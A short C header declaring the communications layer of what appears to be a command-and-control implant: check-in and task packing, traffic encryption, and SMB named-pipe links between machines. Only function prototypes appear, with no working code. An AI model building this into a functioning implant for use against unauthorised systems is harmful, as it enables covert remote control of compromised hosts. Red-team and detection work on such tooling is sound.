#ifndef COMMS_H
#define COMMS_H

#include <windows.h>
#include <stddef.h>

int comms_pack_checkin(void **out_data, size_t *out_len);
int comms_pack_output(int task_id, const void *data, size_t len, void **out_data, size_t *out_len);
int comms_unpack_tasks(const void *data, size_t len, void **out_tasks, int *out_count);

int comms_encrypt(const void *plaintext, size_t pt_len, const void *key, size_t key_len, void **out_ct, size_t *out_ct_len);
int comms_decrypt(const void *ciphertext, size_t ct_len, const void *key, size_t key_len, void **out_pt, size_t *out_pt_len);

void *comms_smb_listen(const char *pipe_name);
void *comms_smb_connect(const char *target, const char *pipe_name);
int comms_smb_send(void *pipe, const void *data, size_t len);
int comms_smb_recv(void *pipe, void *buf, size_t capacity);
void comms_smb_close(void *pipe);

#endif
